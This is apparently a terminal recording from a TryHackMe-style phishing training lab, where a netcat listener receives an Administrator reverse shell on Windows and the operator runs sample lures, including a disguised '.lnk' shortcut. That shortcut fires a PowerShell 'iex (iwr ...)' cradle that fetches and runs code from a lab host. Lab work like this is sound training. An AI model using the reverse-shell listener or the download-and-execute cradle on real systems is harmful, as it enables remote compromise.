@@ -1,0 +1,150 @@
+Script started on 2025-07-20 13:24:04+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="26"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [192.168.77.193] from (UNKNOWN) [192.168.64.1] 7588
+[KMicrosoft Windows [Version 10.0.17763.7314][KMicrosoft Windows [Version 10.0.17763.7314][KMicrosoft Windows [Version 10.0.17763.7314]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Downloads>[KC:\Users\Administrator\Downloads>[K[?2004hC:\Users\Administrator\Downloads>cd ..\Desktop[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..\Desktop
+[Kcd ..\Desktop
+[K
+C:\Users\Administrator\Desktop>[KC:\Users\Administrator\Desktop>[K[?2004hC:\Users\Administrator\Desktop>dir[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdir
+[Kdir
+[K Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/25/2025  10:33 PM    <DIR>          .
+05/25/2025  10:33 PM    <DIR>          ..
+06/05/2025  06:50 PM    <DIR>          Practice
+               0 File(s)              0 bytes
+               3 Dir(s)  13,577,736,192 bytes free
+
+C:\Users\Administrator\Desktop>[KC:\Users\Administrator\Desktop>[K[?2004hC:\Users\Administrator\Desktop>cd P     [Kractis[Kce[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd Practice
+[Kcd Practice
+[K
+C:\Users\Administrator\Desktop\Practice>[KC:\Users\Administrator\Desktop\Practice>[K[?2004hC:\Users\Administrator\Desktop\Practice>dir[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdir
+[Kdir
+[K Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop\Practice
+
+06/05/2025  06:50 PM    <DIR>          .
+06/05/2025  06:50 PM    <DIR>          ..
+05/20/2025  07:38 PM    <DIR>          Phishing Case 1
+05/20/2025  07:38 PM    <DIR>          Phishing Case 2
+06/05/2025  06:50 PM    <DIR>          Phishing Case 3
+05/20/2025  09:01 PM    <DIR>          RDP Case
+05/20/2025  07:38 PM    <DIR>          USB Case
+               0 File(s)              0 bytes
+               7 Dir(s)  13,577,736,192 bytes free
+
+C:\Users\Administrator\Desktop\Practice>[KC:\Users\Administrator\Desktop\Practice>[K[?2004hC:\Users\Administrator\Desktop\Practice>cd "[7mPhishing Case 3[27mPhishing Case 3"[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd "Phishing Case 3"
+[Kcd "Phishing Case 3"
+[K
+C:\Users\Administrator\Desktop\Practice\Phishing Case 3>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 3>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 3>cd ..\"[7mPhishing Case 3[27m[1PPhishing Case 1"[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..\"Phishing Case 1"
+[Kcd ..\"Phishing Case 1"
+[K
+C:\Users\Administrator\Desktop\Practice\Phishing Case 1>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 1>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 1>dir[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdir
+[Kdir
+[K Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop\Practice\Phishing Case 1
+
+05/20/2025  07:38 PM    <DIR>          .
+05/20/2025  07:38 PM    <DIR>          ..
+05/20/2025  05:19 PM         2,323,968 www.skype.com
+               1 File(s)      2,323,968 bytes
+               2 Dir(s)  13,577,736,192 bytes free
+
+C:\Users\Administrator\Desktop\Practice\Phishing Case 1>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 1>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 1>.\"[7mwww.skype.com[27mwww.skype.com"[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h.\"www.skype.com"
+[K.\"www.skype.com"
+[KOpening web browser for you...
+[KLoading www.skype.com page...
+[KRendering HTML and CSS for you...
+[KJust kidding, I am just a malware...
+[KTHM{misleading_extension}
+[K[K[?2004h[?2004l[?2004h
+[KNow breaching your system...
+[K
+C:\Users\Administrator\Desktop\Practice\Phishing Case 1>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 1>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 1>cd ..\"[7mPhishing Case 3[27m[1PPhishing Case 2"[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..\"Phishing Case 2"
+[Kcd ..\"Phishing Case 2"
+[K
+C:\Users\Administrator\Desktop\Practice\Phishing Case 2>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 2>dir[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdir
+[Kdir
+[K Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop\Practice\Phishing Case 2
+
+05/20/2025  07:38 PM    <DIR>          .
+05/20/2025  07:38 PM    <DIR>          ..
+05/20/2025  06:39 PM         1,509,795 New PC Store!.zip
+               1 File(s)      1,509,795 bytes
+               2 Dir(s)  13,577,805,824 bytes free
+
+C:\Users\Administrator\Desktop\Practice\Phishing Case 2>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 2>.\"[7mNew PC Store!.zip[27mNew PC Store!.zip"[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h.\"New PC Store!.zip"
+[K.\"New PC Store!.zip"
+[K
+C:\Users\Administrator\Desktop\Practice\Phishing Case 2>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 2>where unzip[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhere unzip
+[Kwhere unzip
+[KINFO: Could not find files for the given pattern(s).
+
+C:\Users\Administrator\Desktop\Practice\Phishing Case 2>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 2>where tar[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhere tar
+[Kwhere tar
+[KC:\Windows\System32\tar.exe
+
+C:\Users\Administrator\Desktop\Practice\Phishing Case 2>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[7mtar -xf file.zip[27m[1Ptar -xf file.zi[K[K[K[K[K[K[K"[7mNew PC Store!.zip[27mNew PC Store!.zip"[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004htar -xf "New PC Store!.zip"
+[Ktar -xf "New PC Store!.zip"
+[K
+C:\Users\Administrator\Desktop\Practice\Phishing Case 2>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 2>dir[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdir
+[Kdir
+[K Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop\Practice\Phishing Case 2
+
+07/20/2025  10:45 AM    <DIR>          .
+07/20/2025  10:45 AM    <DIR>          ..
+05/20/2025  06:36 PM         1,509,600 New PC Store!.png
+05/20/2025  06:39 PM         1,509,795 New PC Store!.zip
+05/20/2025  06:37 PM             2,403 Official Website.lnk
+               3 File(s)      3,021,798 bytes
+               2 Dir(s)  13,575,540,736 bytes free
+
+C:\Users\Administrator\Desktop\Practice\Phishing Case 2>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 2>.\"[7mOfficial Website.lnk[27mOfficial Website.lnk"[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004h.\"Official Website.lnk"
+[K.\"Official Website.lnk"
+[Kiwr : The remote name could not be resolved: 'wp16.hqywlqpa.thm'
+[KAt line:1 char:6
++ iex (iwr -UseBasicParsing http://wp16.hqywlqpa.thm:8000/cgi-bin/f).Co ...
++      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc 
+   eption
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+ 
+
+C:\Users\Administrator\Desktop\Practice\Phishing Case 2>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 2>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 2>cd ..\"[7mPhishing Case 3[27mPhishing Case 3"[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..\"Phishing Case 3"
+[Kcd ..\"Phishing Case 3"
+[K
+C:\Users\Administrator\Desktop\Practice\Phishing Case 3>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 3>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 3>dir[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdir
+[Kdir
+[K Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of C:\Users\Administrator\Desktop\Practice\Phishing Case 3
+
+06/05/2025  06:50 PM    <DIR>          .
+06/05/2025  06:50 PM    <DIR>          ..
+05/20/2025  04:40 PM         8,391,680 best-cat.jpg.exe
+05/20/2025  06:41 PM            46,414 nice-cat-1.jpg
+05/20/2025  06:41 PM           299,653 nice-cat-2.png
+05/20/2025  07:02 PM         1,118,208 Phishing-Sysmon.evtx
+               4 File(s)      9,855,955 bytes
+               2 Dir(s)  13,575,622,656 bytes free
+
+C:\Users\Administrator\Desktop\Practice\Phishing Case 3>[KC:\Users\Administrator\Desktop\Practice\Phishing Case 3>[K[?2004hC:\Users\Administrator\Desktop\Practice\Phishing Case 3>exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+[?2004l
+Script done on 2025-07-20 13:51:21+03:00 [COMMAND_EXIT_CODE="0"]
